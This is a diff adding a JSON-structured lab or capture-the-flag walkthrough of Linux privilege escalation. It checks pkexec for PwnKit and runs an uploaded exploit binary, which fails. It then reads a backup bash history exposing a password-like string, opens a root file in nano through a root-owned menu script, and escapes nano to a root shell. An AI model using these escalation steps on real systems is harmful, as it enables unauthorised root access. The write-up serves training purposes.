@@ -1,0 +1,246 @@
+[
+  {
+    "type": "section_heading",
+    "id": "pwnkit-intro",
+    "text": "PwnKit Privilege Escalation (CVE-2021-4034)"
+  },
+  {
+    "type": "order_block",
+    "id": "pwnkit-definition",
+    "text": "PwnKit is a local privilege escalation vulnerability in <highlight>polkit's pkexec</highlight>. If the binary is vulnerable, a low‑privileged user can exploit it to execute commands as <highlight>root</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "initial-shell",
+    "text": "Initial Foothold"
+  },
+  {
+    "type": "output_block",
+    "id": "initial-shell-output",
+    "language": "bash",
+    "code": "www-data@ip-10-113-173-52:/dev/shm$"
+  },
+  {
+    "type": "order_block",
+    "id": "initial-shell-explain",
+    "text": "The system was compromised and a low‑privilege shell was obtained as the <highlight>www-data</highlight> user."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "check-pkexec",
+    "text": "Checking pkexec Version"
+  },
+  {
+    "type": "code_block",
+    "id": "pkexec-version-command",
+    "language": "bash",
+    "code": "pkexec --version"
+  },
+  {
+    "type": "output_block",
+    "id": "pkexec-version-output",
+    "language": "bash",
+    "code": "pkexec version 0.105"
+  },
+  {
+    "type": "order_block",
+    "id": "pkexec-version-analysis",
+    "text": "The system is running a version of pkexec that may be vulnerable to <highlight>PwnKit</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "check-suid",
+    "text": "Checking if pkexec is SUID"
+  },
+  {
+    "type": "code_block",
+    "id": "pkexec-suid-command",
+    "language": "bash",
+    "code": "ls -l /usr/bin/pkexec"
+  },
+  {
+    "type": "output_block",
+    "id": "pkexec-suid-output",
+    "language": "bash",
+    "code": "-rwsr-xr-x 1 root root 31032 Feb 21 2022 /usr/bin/pkexec"
+  },
+  {
+    "type": "order_block",
+    "id": "pkexec-suid-analysis",
+    "text": "The <highlight>s</highlight> flag confirms that the binary is running with <highlight>SUID root privileges</highlight>, meaning it executes as root even when run by normal users."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "exploit-upload",
+    "text": "Uploading PwnKit Exploit"
+  },
+  {
+    "type": "output_block",
+    "id": "exploit-upload-output",
+    "language": "bash",
+    "code": "www-data@ip-10-113-173-52:/dev/shm$ ls\n'GCONV_PATH=.'   PwnKit"
+  },
+  {
+    "type": "order_block",
+    "id": "exploit-upload-analysis",
+    "text": "The PwnKit exploit was uploaded to the writable directory <highlight>/dev/shm</highlight>."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "running-exploit",
+    "text": "Running the Exploit"
+  },
+  {
+    "type": "code_block",
+    "id": "run-exploit-command",
+    "language": "bash",
+    "code": "./PwnKit"
+  },
+  {
+    "type": "output_block",
+    "id": "run-exploit-output",
+    "language": "bash",
+    "code": "Failed to copy file: File exists"
+  },
+  {
+    "type": "order_block",
+    "id": "run-exploit-analysis",
+    "text": "The exploit attempted to trigger the vulnerability by abusing the GCONV_PATH environment variable used by pkexec."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "backup-discovery",
+    "text": "Discovering Backup Files"
+  },
+  {
+    "type": "code_block",
+    "id": "backup-navigation",
+    "language": "bash",
+    "code": "cd /var/backups/mike_home_backup\nls -la"
+  },
+  {
+    "type": "order_block",
+    "id": "backup-analysis",
+    "text": "A backup of the user <highlight>mike</highlight>'s home directory was discovered inside the system backups."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "bash-history",
+    "text": "Reading User Bash History"
+  },
+  {
+    "type": "code_block",
+    "id": "bash-history-command",
+    "language": "bash",
+    "code": "cat .bash_history"
+  },
+  {
+    "type": "output_block",
+    "id": "bash-history-output",
+    "language": "bash",
+    "code": "cd ~\nls\nping 1.1.1.1\ncat /home/mike/user.txt\ncd /var/www/\nls\ncd html\nls -al\ncat index.html\nsudo -lb3stpassw0rdbr0xx\nclear\nsudo -l\nexit"
+  },
+  {
+    "type": "order_block",
+    "id": "bash-history-analysis",
+    "text": "The bash history revealed that the user <highlight>mike</highlight> executed sudo commands and exposed a password in the command line."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "rootkit-script",
+    "text": "Finding a Root-Owned Script"
+  },
+  {
+    "type": "code_block",
+    "id": "rootkit-script-command",
+    "language": "bash",
+    "code": "cat /opt/rootkit.sh"
+  },
+  {
+    "type": "code_block",
+    "id": "rootkit-script-content",
+    "language": "bash",
+    "code": "#!/bin/bash\n\nread -e -p \"Would you like to versioncheck, update, list or read the report ? \" ans;\n\ncase $ans in\nversioncheck)\n/usr/bin/rkhunter --versioncheck ;;\nupdate)\n/usr/bin/rkhunter --update;;\nlist)\n/usr/bin/rkhunter --list;;\nread)\n/bin/nano /root/report.txt;;\n*)\nexit;;\nesac"
+  },
+  {
+    "type": "order_block",
+    "id": "rootkit-script-analysis",
+    "text": "The script allows reading the file <highlight>/root/report.txt</highlight> using the nano editor."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nano-root-file",
+    "text": "Opening Root File With Nano"
+  },
+  {
+    "type": "code_block",
+    "id": "nano-command",
+    "language": "bash",
+    "code": "/bin/nano /root/report.txt"
+  },
+  {
+    "type": "order_block",
+    "id": "nano-analysis",
+    "text": "Because the script runs with elevated privileges, opening the file through nano allows interacting with a root-owned file."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "nano-shell",
+    "text": "Escaping Nano to Get a Shell"
+  },
+  {
+    "type": "code_block",
+    "id": "nano-shell-command",
+    "language": "bash",
+    "code": "Ctrl+R\nCtrl+X\nreset; bash 1>&0 2>&0"
+  },
+  {
+    "type": "order_block",
+    "id": "nano-shell-analysis",
+    "text": "Nano allows command execution features that can be abused to spawn a shell when opened with elevated privileges."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "root-shell",
+    "text": "Root Access Obtained"
+  },
+  {
+    "type": "output_block",
+    "id": "root-shell-output",
+    "language": "bash",
+    "code": "root@ip-10-113-173-52:~#"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "pwnkit-summary",
+    "text": "Summary of Attack Path"
+  },
+  {
+    "type": "explanation",
+    "id": "pwnkit-steps",
+    "title": "Steps Performed",
+    "items": [
+      "Obtained initial shell as www-data",
+      "Checked pkexec version and SUID permissions",
+      "Uploaded PwnKit exploit to /dev/shm",
+      "Attempted privilege escalation using pkexec vulnerability",
+      "Enumerated backup files inside /var/backups",
+      "Discovered bash history of user mike",
+      "Found root-owned rootkit script",
+      "Abused script option to open root file using nano",
+      "Escaped nano to spawn a root shell"
+    ]
+  }
+]
